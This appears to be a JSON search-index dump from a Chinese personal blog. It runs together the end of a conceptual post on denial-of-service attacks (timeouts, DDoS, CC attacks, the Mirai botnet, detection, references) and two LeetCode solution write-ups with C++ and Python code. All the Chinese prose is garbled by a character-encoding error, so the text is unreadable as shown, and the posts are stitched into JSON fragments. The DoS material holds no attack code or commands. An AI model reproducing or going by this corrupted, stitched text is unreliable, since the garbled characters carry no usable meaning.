é˜²å¾¡æ­¤ç±»æ”»å‡»çš„æœ€ç®€å•åŠæ³•å°±æ˜¯è®¾ç½®ä¸€ä¸ªè¶…æ—¶æ—¶é—´å’Œæœ€å°é€Ÿç‡ã€‚å¦‚æœå®¢æˆ·ç«¯ä¸èƒ½åœ¨é…ç½®æ—¶é—´å‘é€å®Œå¤´éƒ¨æˆ–bodyæ•°æ®ï¼ŒæœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ª408 REQUEST_TIME_OUTé”™è¯¯ï¼›å¦‚æœå®¢æˆ·ç«¯ä¸èƒ½åœ¨æŒ‡å®šæ—¶é—´å†…æ¥å—å®Œæ•°æ®ï¼Œä¹Ÿä¼šå¼•å‘è¶…æ—¶ã€‚\nè¿™æ ·çš„é˜²å¾¡æªæ–½å®é™…ä¸Šåœ¨ç½‘ç»œæ¡ä»¶ä¸å¥½çš„æƒ…å†µä¸‹ä¼šè¯¯ä¼¤æ­£å¸¸ç”¨æˆ·ï¼Œæ¯”å¦‚ä»ä¸­å›½å¤§é™†ä¸‹è½½å›½å¤–æœåŠ¡å™¨ä¸Šçš„å¤§æ–‡ä»¶æ—¶ï¼Œå¯èƒ½å¼•å‘è¶…æ—¶ã€‚\nDDoS åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆDistributed Denial of Serviceï¼‰ï¼Œæ˜¯DoSæ”»å‡»çš„æ”¹è¿›ç‰ˆæœ¬ã€‚ä¼ ç»Ÿçš„DoSæ”»å‡»æ˜¯ä¸€å¯¹ä¸€çš„æ”»å‡»ï¼Œè¿™åœ¨ç®—åŠ›é£æ¶¨çš„ä»Šå¤©å·²ç»æ•ˆæœè¾ƒå·®äº†ã€‚\næ‰€è°“åˆ†å¸ƒå¼ï¼Œå°±æ˜¯æ§åˆ¶å¤§é‡çš„ä¸»æœºåŒæ—¶å‘åŠ¨DoSæ”»å‡»ï¼ˆå¦‚SYN FLOODï¼‰ï¼Œè§„æ¨¡è¶Šå¤§ï¼Œåˆ™æµé‡æˆå€åœ°ä¸Šå‡ï¼Œæ•ˆæœéå¸¸å¼ºæ‚ã€‚\nCCæ”»å‡»ï¼ˆChallenge Collapsarï¼‰ CCæ”»å‡»çš„åŸç†å°±æ˜¯æ”»å‡»è€…æ§åˆ¶æŸäº›ä¸»æœºä¸åœåœ°å‘å¤§é‡æ•°æ®åŒ…ç»™å¯¹æ–¹æœåŠ¡å™¨é€ æˆæœåŠ¡å™¨èµ„æºè€—å°½ï¼Œä¸€ç›´åˆ°å®•æœºå´©æºƒã€‚è¿™ç±»æ”»å‡»å…·æœ‰çœŸå®æ€§é«˜ã€æ£€æµ‹å›°éš¾ã€é˜²å¾¡å›°éš¾çš„ç‰¹ç‚¹ã€‚\nåœ¨ç‰©è”ç½‘å¿«é€Ÿå‘å±•çš„æ—¶ä»£ï¼Œç‰©è”ç½‘è®¾å¤‡çš„å®‰å…¨å´åˆšåˆšèµ·æ­¥ã€‚è®¸å¤šIoTè®¾å¤‡ä½¿ç”¨é»˜è®¤å¯†ç ï¼Œä¸”è¢«æ§åˆ¶ä¹‹åå¾€å¾€æ²¡æœ‰ä»»ä½•ç—‡çŠ¶ï¼Œè¿™ä½¿å¾—IoTè®¾å¤‡æˆä¸ºäº†å‘åŠ¨DDoSæ”»å‡»çš„ç†æƒ³è‚‰é¸¡ã€‚ä¸–ç•Œä¸Šæœ€å¤§çš„åƒµå°¸ç½‘ç»œMiraiå°±åŒ…å«å¤§é‡çš„ç‰©è”ç½‘è®¾å¤‡ï¼Œå®ƒä»¬æ›¾å‘èµ·å¤§è§„æ¨¡çš„åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡æ”»å‡»ï¼Œå¯¼è‡´ç¾å›½ä¸œæµ·å²¸å¤§é¢ç§¯æ–­ç½‘ã€‚\nç¯‡å¹…æœ‰é™ï¼Œå¯¹äºDoSçš„æ£€æµ‹å°±ä¸è¯¦ç»†å±•å¼€äº†ã€‚ç›®å‰ï¼Œå¸¸è§çš„DoSæ£€æµ‹æ˜¯åŸºäºå¼‚å¸¸çš„æ£€æµ‹ï¼Œå³é€šè¿‡ç›‘è§†å®¡è®¡ç³»ç»Ÿè®°å½•ç³»ç»Ÿä¸Šçš„å¼‚å¸¸æƒ…å†µã€‚æ¯”å¦‚å½“æ—¥å¿—è®°å½•åˆ°æŸä¸€æ—¶æ®µçˆ†å‘å¤§é‡çš„æµé‡ï¼Œè¶…å‡ºäº†å¹³æ—¶çš„ç»Ÿè®¡é˜ˆå€¼æ—¶ï¼Œå¯èƒ½è¡¨ç¤ºæ­¤æ—¶æ®µç³»ç»Ÿå—åˆ°äº†DoSæ”»å‡»ã€‚\nå‚è€ƒèµ„æ–™ [1] ç™¾åº¦ç™¾ç§‘.pingï¼ˆç½‘ç»œè¯Šæ–­å·¥å…·ï¼‰[EB/OL]\nhttps://baike.baidu.com/item/ping/6235\n[2] ç™¾åº¦ç™¾ç§‘.ICMP[EB/OL]\nhttps://baike.baidu.com/item/ICMP/572452\n[3] ç™¾åº¦ç™¾ç§‘.Ping of Death[EB/OL]\nhttps://baike.baidu.com/item/Ping%20of%20Death\n[4] å°ç™½æ•™ç¨‹.æ­»äº¡ä¹‹pingçš„å·¥ä½œåŸç†ä»¥åŠå¦‚ä½•é¢„é˜²[EB/OL]\nhttps://www.schoolw3c.com/ping-of-death/\n[5] ç‹é“è®ºå›.2021å¹´è®¡ç®—æœºç½‘ç»œè€ƒç ”å¤ä¹ æŒ‡å¯¼[M].åŒ—äº¬:ç”µå­å·¥ä¸šå‡ºç‰ˆç¤¾,2020:147-157\n[6] å­¤å›.IPé¦–éƒ¨[EB/OL].2019-03-17\nhttps://blog.csdn.net/Wu000999/article/details/88617237\n[7] å¿«å¿«ç½‘ç»œ.ä»€ä¹ˆæ˜¯Teardropæ”»å‡»ï¼Ÿæˆ‘ä»¬è¦å¦‚ä½•é˜²å¾¡Teardropæ”»å‡»ï¼Ÿ[EB/OL].2019-03-13\nhttps://www.jianshu.com/p/3ac57cfb3743\n[8] ä¸€åªITå°å°é¸Ÿ.DDoSæ”»å‡»\u0026ndash;Syn_Floodæ”»å‡»é˜²æŠ¤è¯¦è§£ï¼ˆTCPï¼‰[EB/OL].2018-08-22\nhttps://blog.csdn.net/qq_34777600/article/details/81946514\n[9] Java.Sheng.SYN FloodåŸç†åŠé˜²æŠ¤[EB/OL].2016-04-16\nhttps://blog.csdn.net/woaigaolaoshi/article/details/51166340\n[10] ç™¾åº¦ç™¾ç§‘.landæ”»å‡»[EB/OL]\nhttps://baike.baidu.com/item/land%E6%94%BB%E5%87%BB/4759470?fr=aladdin\n[11] ç™¾åº¦ç™¾ç§‘.Smurfæ”»å‡»[EB/OL]\nhttps://baike.baidu.com/item/Smurf%E6%94%BB%E5%87%BB/9112141?fr=aladdin\n[12] fcm.HTTP Floodæ”»å‡»ä¸é˜²å¾¡åŸç†[EB/OL].2015-10-19\nhttps://forum.huawei.com/enterprise/zh/thread-293931.html\n[13] ä¸­å›½ç½‘ç§‘æŠ€.Miraiåƒµå°¸ç½‘ç»œå†ä½œä¹± 360ï¼šç‰©è”ç½‘è®¾å¤‡æˆéšç§æ³„éœ²é‡ç¾åŒº[EB/OL].2020-12-07\nhttp://tech.china.com.cn/roll/20201207/372546.shtml\n[14] wpjamer.CCæ”»å‡»åŸç†åŠé˜²èŒƒæ–¹æ³•[EB/OL].2018-05-12\nhttps://www.cnblogs.com/wpjamer/p/9030259.html\n","date":"2021-02-02T00:00:00Z","permalink":"https://xrg.fj.cn/p/dos%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/","title":"DoSâ€”â€”æ‹’ç»æœåŠ¡æ”»å‡»"},{"content":"ç¾å¥½çš„äºŒæœˆä»WAä¸€é“ç®€å•é¢˜å¼€å§‹ã€‚\né¢˜ç›®é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/fair-candy-swap/\næè¿°\nçˆ±ä¸½ä¸å’Œé²å‹ƒæœ‰ä¸åŒå¤§å°çš„ç³–æœæ£’ï¼šA[i] æ˜¯çˆ±ä¸½ä¸æ‹¥æœ‰çš„ç¬¬ i æ ¹ç³–æœæ£’çš„å¤§å°ï¼ŒB[j] æ˜¯é²å‹ƒæ‹¥æœ‰çš„ç¬¬ j æ ¹ç³–æœæ£’çš„å¤§å°ã€‚\nå› ä¸ºä»–ä»¬æ˜¯æœ‹å‹ï¼Œæ‰€ä»¥ä»–ä»¬æƒ³äº¤æ¢ä¸€æ ¹ç³–æœæ£’ï¼Œè¿™æ ·äº¤æ¢åï¼Œä»–ä»¬éƒ½æœ‰ç›¸åŒçš„ç³–æœæ€»é‡ã€‚ï¼ˆä¸€ä¸ªäººæ‹¥æœ‰çš„ç³–æœæ€»é‡æ˜¯ä»–ä»¬æ‹¥æœ‰çš„ç³–æœæ£’å¤§å°çš„æ€»å’Œã€‚ï¼‰\nè¿”å›ä¸€ä¸ªæ•´æ•°æ•°ç»„ ansï¼Œå…¶ä¸­ ans[0] æ˜¯çˆ±ä¸½ä¸å¿…é¡»äº¤æ¢çš„ç³–æœæ£’çš„å¤§å°ï¼Œans[1] æ˜¯ Bob å¿…é¡»äº¤æ¢çš„ç³–æœæ£’çš„å¤§å°ã€‚\nå¦‚æœæœ‰å¤šä¸ªç­”æ¡ˆï¼Œä½ å¯ä»¥è¿”å›å…¶ä¸­ä»»ä½•ä¸€ä¸ªã€‚ä¿è¯ç­”æ¡ˆå­˜åœ¨ã€‚\nç¤ºä¾‹1\nè¾“å…¥ï¼š A = [1,1], B = [2,2]\nè¾“å‡ºï¼š[1,2]\nç¤ºä¾‹2\nè¾“å…¥ï¼š A = [1,2], B = [2,3]\nè¾“å‡ºï¼š[1,2]\næ•°æ®èŒƒå›´\n1 \u0026lt;= A.length \u0026lt;= 10000 1 \u0026lt;= B.length \u0026lt;= 10000 1 \u0026lt;= A[i] \u0026lt;= 100000 1 \u0026lt;= B[i] \u0026lt;= 100000 ä¿è¯çˆ±ä¸½ä¸ä¸é²å‹ƒçš„ç³–æœæ€»é‡ä¸åŒã€‚ ç­”æ¡ˆè‚¯å®šå­˜åœ¨ã€‚ åˆ†æ å¸Œæœ›æ»¡è¶³äº¤æ¢åçš„æ€»å’Œç›¸ç­‰ï¼Œä¸éš¾çœ‹å‡ºäº¤æ¢çš„æ•°é‡éœ€è¦æ»¡è¶³ä¸€å®šçš„å…³ç³»ã€‚\næˆ‘ä»¬è®¾Alliceæ‹¿æ¥äº¤æ¢çš„å¤§å°æ˜¯changeAï¼ŒBobæ‹¿æ¥äº¤æ¢çš„å¤§å°æ˜¯changeBï¼›ä¸¤äººäº¤æ¢å‰åˆ†åˆ«å…·æœ‰sumAå’ŒsumBæ€»é‡çš„ç³–æœï¼Œåˆ™ä¸¤äººäº¤æ¢ä¹‹åæ‹¥æœ‰çš„æ€»é‡åˆ†åˆ«æ˜¯ï¼š\nAlliceï¼šsumA - changeA + changeB Bobï¼šsumB - changeB + changeA ä¸¤ä¸ªå¼å­æ˜¯ç›¸ç­‰çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿›è¡Œç›¸å‡ï¼Œå¾—åˆ°sumA - sumB + 2changeB - 2changeA = 0ï¼›\nè¿›ä¸€æ­¥ä½¿ç”¨diffæ¥è¡¨ç¤ºsumA - sumBï¼Œå³åˆå§‹æ€»é‡ä¹‹å·®ï¼Œåˆ™å¯¹ç­‰å¼å˜å½¢èƒ½å¾—åˆ°ï¼šchangeA = changeB + diff / 2ã€‚\nè¿™å°±æ˜¯æˆ‘ä»¬æœ€ç»ˆä½¿ç”¨çš„å…¬å¼ï¼ŒchangeAå’ŒchangeBæ»¡è¶³çš„å…³ç³»ã€‚\næš´åŠ› æˆ‘ä»¬å¯ä»¥å¾ªç¯Alliceçš„æ¯ä¸€ä¸ªç³–æœæ£’ï¼Œå³å¯¹äºæ¯ä¸€ä¸ªchangeAï¼Œåªéœ€è¦ä½¿ç”¨å…¬å¼è®¡ç®—changeBï¼Œç„¶ååˆ¤æ–­changeBæ˜¯å¦å­˜åœ¨äºBobçš„é›†åˆä¸­ï¼›å½“æˆ‘ä»¬æ‰¾åˆ°äº†ä¸€å¯¹changeAå’ŒchangeBåŒæ—¶å­˜åœ¨ï¼Œå°±æ˜¯æœ€ç»ˆçš„ç­”æ¡ˆã€‚\nåˆ™è½¬åŒ–æˆä¸ºä¸€ä¸ªæœç´¢é—®é¢˜ï¼Œå¯¹äºä¸€ä¸ªç‰¹å®šçš„changeBï¼Œåœ¨Bobçš„é›†åˆä¸­æŸ¥æ‰¾å®ƒæ˜¯å¦å­˜åœ¨ã€‚\nä½¿ç”¨é¡ºåºæœç´¢ï¼Œä¸€å±‚å¾ªç¯changeAï¼Œæ¯ä¸ªchangeAè¿˜éœ€è¦éå†ä¸€æ¬¡Bobçš„é›†åˆï¼Œå¤æ‚åº¦æ˜¯O(n^2)ï¼Œæ˜¾ç„¶ä¸è¡Œï¼›\nä½¿ç”¨äºŒåˆ†æœç´¢ï¼Œä¸€å±‚å¾ªç¯changeAï¼Œæ¯ä¸ªchangeAæœç´¢å¯¹åº”çš„changeBåªéœ€è¦èŠ±è´¹lognï¼Œåˆ™æ€»å¤æ‚åº¦æ˜¯O(nlogn)ï¼Œå¯ä»¥ä¸€è¯•ã€‚\nç¬¬ä¸€æ¬¡WAï¼ŒäºŒåˆ†å†™é”™äº†\u0026hellip;\næš´åŠ›äºŒåˆ†ï¼ŒACä»£ç ï¼š class Solution { public: typedef long long LL; const int INF = 0xffffff; int bSearch(int target, vector\u0026lt;int\u0026gt; v) { int left = 0; int right = v.size() - 1; int res = -INF; while (left \u0026lt;= right) { int mid = (left + right) / 2; if (v[mid] \u0026lt; target) // ç­”æ¡ˆåœ¨å³åŠéƒ¨åˆ† { left = mid + 1; continue; } else if (v[mid] \u0026gt; target) // ç­”æ¡ˆåœ¨å·¦åŠéƒ¨åˆ† { right = mid - 1; continue; } else { res = target; break; } } return res; // æ²¡æ‰¾åˆ°ï¼Œ-INFï¼›æ‰¾åˆ°ï¼Œtarget } vector\u0026lt;int\u0026gt; fairCandySwap(vector\u0026lt;int\u0026gt;\u0026amp; A, vector\u0026lt;int\u0026gt;\u0026amp; B) { sort(A.begin(), A.end()); sort(B.begin(), B.end()); LL sum_a = 0; LL sum_b = 0; for (int i = 0; i \u0026lt; A.size(); ++i) sum_a += A[i]; for (int i = 0; i \u0026lt; B.size(); ++i) sum_b += B[i]; LL diff = sum_a - sum_b; int change_a, change_b; // change_a = change_b + diff / 2 vector\u0026lt;int\u0026gt; res; for (int i = 0; i \u0026lt; A.size(); ++i) { change_a = A[i]; change_b = change_a - diff / 2; // cout \u0026lt;\u0026lt; change_a \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; change_b \u0026lt;\u0026lt; endl; if(bSearch(change_b, B) != -INF) // æ‰¾åˆ° { res.push_back(change_a); res.push_back(change_b); break; } } return res; } }; å¯¹äºä¸€ä¸ªvectorè¿›è¡ŒäºŒåˆ†æŸ¥æ‰¾ï¼Œåˆå§‹åŒ–right = v.size() - 1ï¼Œç¬¬ä¸€æ¬¡WAçš„æ—¶å€™æ²¡æœ‰å‡ä¸€ï¼›\nwhileå¾ªç¯ï¼Œåˆ¤æ–­æ¡ä»¶åº”è¯¥æ˜¯left \u0026lt;= rightï¼Œç¬¬ä¸€æ¬¡WAçš„æ—¶å€™ä¹Ÿæ²¡æœ‰ç­‰å·ã€‚\näºŒåˆ†è¿˜æ˜¯ç»†å•Šo(â•¥ï¹â•¥)o\nä¸è¿‡è¡¨ç°å°±çƒ‚æˆè›‡çš®äº†ã€‚\nPerformance 1 åŒæŒ‡é’ˆ åœ¨æŸ¥æ‰¾changeAå’ŒchangeBçš„æ—¶å€™æ˜¯å¦å­˜åœ¨O(n) çš„åŠæ³•å‘¢ï¼Ÿæ˜¯å­˜åœ¨çš„ã€‚\nå‡è®¾Alliceå’ŒBobçš„é›†åˆéƒ½å·²ç»ä»å°åˆ°å¤§æ’å¥½åºï¼Œä½¿ç”¨ä¸€ä¸ªpAæŒ‡å‘Alliceçš„é›†åˆèµ·å§‹å…ƒç´ ï¼ŒpBæŒ‡å‘Bobçš„é›†åˆèµ·å§‹å…ƒç´ ï¼Œç”¨å¦‚ä¸‹è§„åˆ™è¿›è¡Œç§»åŠ¨ï¼š\nå½“*pA \u0026gt; *pB + diff / 2çš„æ—¶å€™ï¼ŒpB++ï¼› å½“*pA \u0026lt; *pB + diff / 2çš„æ—¶å€™ï¼ŒpA++ï¼› ä¸¤è€…ç›¸ç­‰çš„æ—¶å€™ï¼Œå°±æ˜¯æˆ‘ä»¬è¦çš„ç­”æ¡ˆã€‚ æ­¤æ³•çš„æ­£ç¡®æ€§ä¸»è¦æ¥è‡ªäºé›†åˆçš„æœ‰åºæ€§ã€‚ç¬¬ä¸€ç§æƒ…å†µå‡ºç°æ—¶ï¼Œè¯´æ˜pBæŒ‡å‘çš„å…ƒç´ å¤ªå°äº†ï¼ŒchangeBéœ€è¦å†å¤§ä¸€ç‚¹ï¼Œæ•…å°†pBå‘åç§»åŠ¨ï¼›å½“ç¬¬äºŒç§æƒ…å†µå‡ºç°çš„æ—¶å€™ï¼Œè¯´æ˜pAæŒ‡å‘çš„å…ƒç´ å¤ªå°äº†ï¼ŒchangeAéœ€è¦å†å¤§ä¸€ç‚¹ã€‚\näºŒåˆ†å’ŒåŒæŒ‡é’ˆæ³•çš„æœ€å¤§å¤æ‚åº¦å…¶å®éƒ½æ˜¯O(nlogn)ï¼ˆæ’åºï¼‰ï¼Œä½†æ˜¯åœ¨æŸ¥æ‰¾è¿‡ç¨‹ä¸­æ˜¾ç„¶åŒæŒ‡é’ˆæ›´å¿«ä¸€äº›ã€‚\nACä»£ç ï¼š class Solution { public: typedef long long LL; vector\u0026lt;int\u0026gt; fairCandySwap(vector\u0026lt;int\u0026gt;\u0026amp; A, vector\u0026lt;int\u0026gt;\u0026amp; B) { sort(A.begin(), A.end()); sort(B.begin(), B.end()); LL sum_a = 0; LL sum_b = 0; for (int i = 0; i \u0026lt; A.size(); ++i) sum_a += A[i]; for (int i = 0; i \u0026lt; B.size(); ++i) sum_b += B[i]; LL diff = sum_a - sum_b; vector\u0026lt;int\u0026gt; res; vector\u0026lt;int\u0026gt;::iterator pA = A.begin(); vector\u0026lt;int\u0026gt;::iterator pB = B.begin(); while (pA != A.end() \u0026amp;\u0026amp; pB != B.end()) { if (*pA \u0026gt; *pB + diff / 2) // pBæŒ‡å‘çš„ç›®æ ‡å¤ªå° { pB++; } else if (*pA \u0026lt; *pB + diff / 2) // pAæŒ‡å‘çš„ç›®æ ‡å¤ªå° { pA++; } else { res.push_back(*pA); res.push_back(*pB); break; } } return res; } }; è¡¨ç°è¿˜ä¸é”™ã€‚\nPerformance 2 å®˜æ–¹é¢˜è§£ä¸­æåˆ°çš„å“ˆå¸Œè¡¨ï¼Œåœ¨æœ€å¼€å§‹æ„æ€çš„æ—¶å€™å°±æƒ³åˆ°äº†ï¼Œä½†æ˜¯æ‡’å¾—å†æŸ¥STLçš„ç”¨æ³•ï¼Œæ•…æ”¾å¼ƒã€‚\né¢˜è§£ä¸­æœ‰ä¸ªè€å“¥ä¸æˆ‘çš„åŒæŒ‡é’ˆæ–¹æ³•ä¸€æ¯›ä¸€æ ·ï¼Œä½†æ˜¯æˆ‘çš„åšæ³•æ˜¯ç‹¬ç«‹æƒ³å‡ºæ¥çš„ï¼Œæ•…ä¸å°†å…¶æ”¾å…¥å‚è€ƒèµ„æ–™ä¸­ã€‚\nå‚è€ƒèµ„æ–™ [1] åŠ›æ‰£å®˜æ–¹é¢˜è§£.å…¬å¹³çš„ç³–æœäº¤æ¢[EB/OL].2021-02-01\nhttps://leetcode-cn.com/problems/fair-candy-swap/solution/gong-ping-de-tang-guo-jiao-huan-by-leetc-tlam/\n","date":"2021-02-01T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode888.-%E5%85%AC%E5%B9%B3%E7%9A%84%E7%B3%96%E6%9E%9C%E6%A3%92%E4%BA%A4%E6%8D%A2/","title":"é”™é¢˜æœ¬ | LeetCode888. å…¬å¹³çš„ç³–æœæ£’äº¤æ¢"},{"content":"æˆ‘çš„ç¬¬ä¸€æ¬¡LeetCodeå‘¨èµ›ï¼Œæœ¬æ¥å¤§æœ‰å¸Œæœ›ACä¸‰é“é¢˜ï¼Œç»“æœåœ¨è¿™ä¸ªç¥å‘ä¸Šè¶´äº†åŠä¸ªå¤šå°æ—¶o(â•¥ï¹â•¥)o\né¢˜ç›®é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/can-you-eat-your-favorite-candy-on-your-favorite-day/\né¢˜ç›® ç»™ä½ ä¸€ä¸ªä¸‹æ ‡ä» 0 å¼€å§‹çš„æ­£æ•´æ•°æ•°ç»„ candiesCount ï¼Œå…¶ä¸­ candiesCount[i] è¡¨ç¤ºä½ æ‹¥æœ‰çš„ç¬¬ i ç±»ç³–æœçš„æ•°ç›®ã€‚åŒæ—¶ç»™ä½ ä¸€ä¸ªäºŒç»´æ•°ç»„ queries ï¼Œå…¶ä¸­ queries[i] = [favoriteTypei, favoriteDayi, dailyCapi] ã€‚\nä½ æŒ‰ç…§å¦‚ä¸‹è§„åˆ™è¿›è¡Œä¸€åœºæ¸¸æˆï¼š\nä½ ä»ç¬¬ 0 å¤©å¼€å§‹åƒç³–æœã€‚ ä½ åœ¨åƒå®Œ æ‰€æœ‰ ç¬¬ i - 1 ç±»ç³–æœä¹‹å‰ï¼Œä¸èƒ½ åƒä»»ä½•ä¸€é¢—ç¬¬ i ç±»ç³–æœã€‚ åœ¨åƒå®Œæ‰€æœ‰ç³–æœä¹‹å‰ï¼Œä½ å¿…é¡»æ¯å¤© è‡³å°‘ åƒ ä¸€é¢— ç³–æœã€‚ è¯·ä½ æ„å»ºä¸€ä¸ªå¸ƒå°”å‹æ•°ç»„ answer ï¼Œæ»¡è¶³ answer.length == queries.length ã€‚answer[i] ä¸º true çš„æ¡ä»¶æ˜¯ï¼šåœ¨æ¯å¤©åƒ ä¸è¶…è¿‡ dailyCapi é¢—ç³–æœçš„å‰æä¸‹ï¼Œä½ å¯ä»¥åœ¨ç¬¬ favoriteDayi å¤©åƒåˆ°ç¬¬favoriteTypeiç±»ç³–æœï¼›å¦åˆ™ answer[i] ä¸º false ã€‚æ³¨æ„ï¼Œåªè¦æ»¡è¶³ä¸Šé¢ 3 æ¡è§„åˆ™ä¸­çš„ç¬¬äºŒæ¡è§„åˆ™ï¼Œä½ å°±å¯ä»¥åœ¨åŒä¸€å¤©åƒä¸åŒç±»å‹çš„ç³–æœã€‚\nè¯·ä½ è¿”å›å¾—åˆ°çš„æ•°ç»„ answer ã€‚\nç¤ºä¾‹1\nè¾“å…¥ï¼šcandiesCount = [7,4,5,3,8], queries = [[0,2,2],[4,2,4],[2,13,1000000000]]\nè¾“å‡ºï¼š[true,false,true]\nç¤ºä¾‹2\nè¾“å…¥ï¼šcandiesCount = [5,2,6,4,1], queries = [[3,1,2],[4,10,3],[3,10,100],[4,100,30],[1,3,1]]\nè¾“å‡ºï¼š[false,true,true,false,false]\næ•°æ®èŒƒå›´\n1 \u0026lt;= candiesCount.length \u0026lt;= 105 1 \u0026lt;= candiesCount[i] \u0026lt;= 105 1 \u0026lt;= queries.length \u0026lt;= 105 queries[i].length == 3 0 \u0026lt;= favoriteTypei \u0026lt; candiesCount.length 0 \u0026lt;= favoriteDayi \u0026lt;= 109 1 \u0026lt;= dailyCapi \u0026lt;= 109 åˆ†æ å¼¯å¼¯ç»•ç»•çš„è§„åˆ™ï¼Œå®é™…ä¸Šå°±æ˜¯åœ¨é—®ï¼šä»å¤´å¼€å§‹åƒï¼Œèƒ½ä¸èƒ½åœ¨ç¬¬favDayå¤©åƒåˆ°favTypeè¿™ç§ç³–æœã€‚\nç”±äºä»ç¬¬0å¤©å¼€å§‹åƒï¼Œæ‰€ä»¥åœ¨favDayè¿™ä¸€å¤©çš„æ—¶å€™ï¼Œå‰é¢ä¸€å…±ä¹Ÿå·²ç»åƒäº†favDayå¤©ã€‚\nè¿™ä¹ˆå¤šå¤©é‡Œï¼Œæœ€å¤šèƒ½åƒæ‰å¤šå°‘ç³–æœï¼Œæœ€å°‘èƒ½åƒæ‰å¤šå°‘ç³–æœå‘¢ï¼Ÿéå¸¸ç®€å•ï¼š\næ¯ä¸ªqueryé‡Œé¢ç»™å‡ºäº†æ¯å¤©æœ€å¤šèƒ½åƒå¤šå°‘ç³–æœï¼Œæˆ‘çš„ç¨‹åºä¸­è®°åšdayCapï¼›\næ¯å¤©æ•å¼€äº†åƒï¼Œä¸ç®—favDayè¿™ä¸€å¤©ï¼Œæœ€å¤šåƒæ‰favDat * dayCapçš„ç³–æœï¼Œç®—ä¸Šè¿™ä¸€å¤©ç»“æŸï¼Œèƒ½åƒæ‰(favDay + 1) * dayCapçš„ç³–æœï¼›\næ¯å¤©çœç€åƒï¼Œä½†æ˜¯è§„å®šè‡³å°‘éœ€è¦åƒæ‰ä¸€é¢—ã€‚ä¸ç®—favDayè¿™ä¸€å¤©ï¼Œæœ€å°‘ä¹Ÿå¾—åƒæ‰favDayçš„ç³–æœã€‚\nç”±äºä»å‰å¾€ååƒï¼Œæ‰€ä»¥åœ¨favDayè¿™ä¸€å¤©èƒ½ä¸èƒ½åƒåˆ°favTypeè¿™ç±»ç³–æœï¼Œå°±è½¬åŒ–ä¸ºäº†favTypeä¹‹å‰çš„æ‰€æœ‰ç³–æœçš„æ•°é‡å’Œä¸ä¸Šé¢è¿™ä¸¤ä¸ªæ•°å€¼çš„å…³ç³»ã€‚åƒä¸åˆ°ç³–æœåªæœ‰ä¸¤ç§å¯èƒ½ï¼Œå¤ªå¤šä¸å¤ªå°‘ï¼š\nå½“æˆ‘ä»¬æ•å¼€äº†åƒï¼Œç»“æœåœ¨favDayè¿™ä¸€å¤©ç»“æŸçš„æ—¶å€™éƒ½æ²¡åŠæ³•åƒåˆ°ç¬¬favTypeç±»ç³–æœï¼Œè¿™æ˜¯ç”±äºå®ƒå‰é¢ç±»å‹çš„ç³–æœæ•°é‡å¤ªå¤šäº†ï¼› å½“æˆ‘ä»¬çœç€åƒï¼Œç»“æœåœ¨favDayè¿™ä¸€å¤©ä¹‹å‰å°±å·²ç»æŠŠfavTypeç±»ç³–æœåƒå®Œäº†ï¼Œè¿™æ˜¯ç”±äºå®ƒå‰é¢ç±»å‹çš„ç³–æœæ•°é‡å¤ªå°‘äº†ï¼› ä½¿ç”¨å‰ç¼€å’Œæ•°ç»„ä¿å­˜favTypeä¹‹å‰çš„ç³–æœæ•°é‡å’Œï¼Œprefix_sum[i]è¡¨ç¤ºç¬¬iç±»ç³–æœä¹‹å‰çš„ç³–æœå’Œï¼ˆä¸åŒ…æ‹¬ç¬¬iç±»ï¼‰ã€‚\nACä»£ç  class Solution: def canEat(self, candiesCount: List[int], queries: List[List[int]]) -\u0026gt; List[bool]: res = [] prefix_sum = [0] for i in range(1, len(candiesCount) + 1): prefix_sum.append(prefix_sum[-1] + candiesCount[i - 1]) # print(len(prefix_sum)) for q in queries: favType = q[0] favDay = q[1] dayCap = q[2] # æ•å¼€äº†åƒï¼Œéƒ½ä¸èƒ½åœ¨favDayç»“æŸçš„æ—¶å€™æŠŠå‰é¢çš„ç³–æœåƒå®Œ # è¿™é‡Œéœ€è¦ç®—ä¸ŠfavDayï¼Œä¸€å…±åƒfavDay + 1å¤© if (favDay + 1) * dayCap \u0026lt;= prefix_sum[favType]: res.append(False) continue # çœç€åƒï¼Œåœ¨favDayä¹‹å‰å°±å·²ç»æŠŠfavTypeåƒå®Œ if favDay \u0026gt;= prefix_sum[favType + 1]: res.append(False) continue res.append(True) return res class Solution { public: typedef long long LL; vector\u0026lt;bool\u0026gt; canEat(vector\u0026lt;int\u0026gt;\u0026amp; candiesCount, vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; queries) { LL prefix_sum[100010] = { 0 }; // prefix_sum[i]: candiesCount[0]åŠ åˆ°candiesCount[i - 1] bool check = false; for (int i = 1; i \u0026lt;= candiesCount.size(); ++i) { prefix_sum[i] = prefix_sum[i - 1] + candiesCount[i - 1]; // cout \u0026lt;\u0026lt; \u0026#34;i = \u0026#34; \u0026lt;\u0026lt; i \u0026lt;\u0026lt; \u0026#34;: \u0026#34; \u0026lt;\u0026lt; prefix_sum[i] \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } LL favDay, favType, dayCap; vector\u0026lt;bool\u0026gt; res; for (auto t : queries) { favDay = t[1]; favType = t[0]; dayCap = t[2]; // ç¬¬favDayä¹‹å‰ï¼Œä¸€å…±åƒäº†favDayå¤© // æ¯å¤©å¼€è¶³é©¬åŠ›åƒï¼Œéƒ½åƒä¸å®Œå‰é¢çš„ // prefix_sum[favType] = candiesCount[0] åŠ åˆ° candiesCount[favType - 1] // å³å¼€å§‹åƒfavTypeä¹‹å‰çš„ç³–æœæ€»å’Œ if ((favDay + 1) * dayCap \u0026lt;= prefix_sum[favType]) { res.push_back(false); continue; } // æ¯å¤©çœç€åƒï¼Œéƒ½åƒä¸å¤Ÿ if (favDay \u0026gt;= prefix_sum[favType + 1]) { res.push_back(false); continue; } res.push_back(true); } return res; } }; 